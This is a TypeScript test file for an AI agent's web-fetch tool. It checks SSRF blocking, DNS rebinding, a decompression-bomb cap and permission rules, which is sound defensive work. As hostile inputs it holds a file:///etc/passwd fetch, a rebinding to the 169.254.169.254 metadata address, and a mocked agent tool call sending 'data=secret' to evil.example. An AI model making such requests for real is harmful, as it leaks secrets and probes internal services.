import { mkdir, mkdtemp, writeFile } from "node:fs/promises";
import { createServer, type Server } from "node:http";
import os from "node:os";
import path from "node:path";
import zlib from "node:zlib";
import { simulateReadableStream } from "ai";
import { MockLanguageModelV4 } from "ai/test";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { generateWith } from "../src/loop.ts";
import { settingsPath } from "../src/rules.ts";
import { handleLine, startState } from "../src/runtime.ts";
import { fetchPage, formatFetch, isPublicAddress } from "../src/webfetch.ts";

describe("which addresses count as public", () => {
  it("blocks loopback, private, link-local/metadata, CGNAT, multicast, ULA and mapped forms", () => {
    for (const ip of ["127.0.0.1", "10.1.2.3", "172.16.0.1", "172.31.255.255", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "224.0.0.1", "255.255.255.255", "::1", "::", "fc00::1", "fd12::1", "fe80::1", "::ffff:127.0.0.1", "::ffff:10.0.0.1", "64:ff9b::a00:1"]) {
      expect(isPublicAddress(ip), ip).toBe(false);
    }
    for (const ip of ["8.8.8.8", "140.82.112.3", "172.32.0.1", "2606:4700::1111", "::ffff:8.8.8.8"]) {
      expect(isPublicAddress(ip), ip).toBe(true);
    }
  });
});

describe("fetchPage refuses before connecting", () => {
  it("non-http(s), passwords, IP literals, local names, and names that resolve privately", async () => {
    expect(await fetchPage("file:///etc/passwd")).toMatchObject({ ok: false, reason: "only http(s) pages can be fetched" });
    expect(await fetchPage("https://user:pw@example.com/")).toMatchObject({ ok: false });
    expect(await fetchPage("https://127.0.0.1/")).toMatchObject({ ok: false, reason: expect.stringContaining("bare IP") });
    expect(await fetchPage("https://[::1]/")).toMatchObject({ ok: false, reason: expect.stringContaining("bare IP") });
    expect(await fetchPage("https://localhost/")).toMatchObject({ ok: false, reason: expect.stringContaining("local name") });
    const rebinding = { lookup: async () => [{ address: "93.184.216.34", family: 4 }, { address: "169.254.169.254", family: 4 }] };
    expect(await fetchPage("https://evil.example/", { testing: rebinding })).toMatchObject({
      ok: false,
      reason: expect.stringContaining("private or local address (169.254.169.254)"),
    });
  });
});

describe("fetchPage against a local test server", () => {
  let server: Server;
  let port = 0;
  beforeAll(async () => {
    server = createServer((req, res) => {
      if (req.url === "/page") {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        return res.end("<html><head><title>t</title><script>steal()</script></head><body><h1>Hello &amp; welcome</h1><p>Line one<br>Line two</p><ul><li>a</li><li>b</li></ul></body></html>");
      }
      if (req.url === "/bomb") {
        res.writeHead(200, { "content-type": "text/plain", "content-encoding": "gzip" });
        return res.end(zlib.gzipSync(Buffer.alloc(8_000_000, 97)));
      }
      if (req.url === "/same") {
        res.writeHead(302, { location: "/page" });
        return res.end();
      }
      if (req.url === "/away") {
        res.writeHead(302, { location: "https://elsewhere.example/x" });
        return res.end();
      }
      if (req.url === "/image") {
        res.writeHead(200, { "content-type": "image/png" });
        return res.end(Buffer.from([0x89, 0x50]));
      }
      res.writeHead(404);
      res.end();
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    port = (server.address() as { port: number }).port;
  });
  afterAll(() => new Promise<void>((resolve) => server.close(() => resolve())));

  const local = () => ({ testing: { lookup: async () => [{ address: "127.0.0.1", family: 4 }], allowPrivate: true, allowHttp: true } });
  const url = (p: string) => `http://site.test:${port}${p}`;

  it("turns HTML into text without scripts, and marks it untrusted", async () => {
    const result = await fetchPage(url("/page"), local());
    expect(result).toMatchObject({ ok: true, status: 200 });
    const text = result.ok ? result.text : "";
    expect(text).toContain("Hello & welcome");
    expect(text).toContain("Line one\nLine two");
    expect(text).toContain("- a");
    expect(text).not.toContain("steal()");
    expect(formatFetch(result)).toContain("<untrusted_web_content");
  });

  it("caps a decompression bomb at 5 MB", async () => {
    const result = await fetchPage(url("/bomb"), local());
    expect(result.ok && result.text).toContain("larger than 5 MB");
    expect(result.ok && result.text.length).toBeLessThan(60_000);
  });

  it("follows a same-site redirect; hands a cross-site one back", async () => {
    expect(await fetchPage(url("/same"), local())).toMatchObject({ ok: true, text: expect.stringContaining("Hello") });
    expect(await fetchPage(url("/away"), local())).toMatchObject({ ok: false, reason: expect.stringContaining("https://elsewhere.example/x") });
  });

  it("does not show binary content", async () => {
    expect(await fetchPage(url("/image"), local())).toMatchObject({ ok: true, text: "[image/png content not shown]" });
  });
});

describe("webfetch passes the lock", () => {
  const usage = {
    inputTokens: { total: 1, noCache: 1, cacheRead: undefined, cacheWrite: undefined },
    outputTokens: { total: 1, text: 1, reasoning: undefined },
  };
  const model = () => {
    let index = 0;
    return new MockLanguageModelV4({
      doStream: async () => {
        index += 1;
        const chunks =
          index === 1
            ? [
                { type: "stream-start", warnings: [] },
                { type: "tool-call", toolCallId: "w", toolName: "webfetch", input: JSON.stringify({ url: "https://evil.example/leak?data=secret" }) },
                { type: "finish", finishReason: { unified: "tool-calls", raw: "tool_calls" }, usage },
              ]
            : [
                { type: "stream-start", warnings: [] },
                { type: "text-start", id: "t" },
                { type: "text-delta", id: "t", delta: "ok" },
                { type: "text-end", id: "t" },
                { type: "finish", finishReason: { unified: "stop", raw: "stop" }, usage },
              ];
        return { stream: simulateReadableStream({ chunks: chunks as never[] }) };
      },
    });
  };

  it("with no rule you are asked, with the host and 'always allow' for that host", async () => {
    const cwd = await mkdtemp(path.join(os.tmpdir(), "aegis-wf-"));
    await mkdir(path.join(cwd, ".aegis"));
    await writeFile(settingsPath(cwd), JSON.stringify({ jev: { mode: "off" } }));
    const state = await startState(cwd, { local: true, mockJev: true });
    const asked: Array<{ q: string; always?: string }> = [];
    const result = await handleLine("fetch", state, { mockJev: true, yes: false, local: true, generate: generateWith(model()) }, async (q, options) => {
      asked.push({ q, always: options?.always });
      return false;
    });
    expect(asked[0]?.q).toContain("evil.example");
    expect(asked[0]?.always).toBe("webfetch evil.example");
    expect(result.receipt?.tools[0]).toMatchObject({ name: "webfetch", approved: false });
  });

  it("a deny rule blocks it without asking", async () => {
    const cwd = await mkdtemp(path.join(os.tmpdir(), "aegis-wf-deny-"));
    await mkdir(path.join(cwd, ".aegis"));
    await writeFile(settingsPath(cwd), JSON.stringify({ jev: { mode: "off" }, rules: { deny: ["webfetch *"] } }));
    const state = await startState(cwd, { local: true, mockJev: true });
    const result = await handleLine("fetch", state, { mockJev: true, yes: false, local: true, generate: generateWith(model()) }, async () => {
      throw new Error("must not ask");
    });
    expect(result.receipt?.tools[0]).toMatchObject({ name: "webfetch", approved: false, rule: "webfetch *" });
  });
});

describe("webfetch rules: review fixes", () => {
  it("'deny webfetch *' covers non-web URLs; unicode host rules match punycode hosts", async () => {
    const { matchRule, DEFAULT_SETTINGS } = await import("../src/rules.ts");
    const s = (rules: object) => ({ ...DEFAULT_SETTINGS, rules: { ...DEFAULT_SETTINGS.rules, ask: [], ...rules } });
    expect(matchRule(s({ deny: ["webfetch *"] }), "webfetch", { url: "file:///etc/passwd" })?.action).toBe("deny");
    expect(matchRule(s({ allow: ["webfetch bücher.de"] }), "webfetch", { url: "https://bücher.de/x" })?.action).toBe("allow");
  });
});
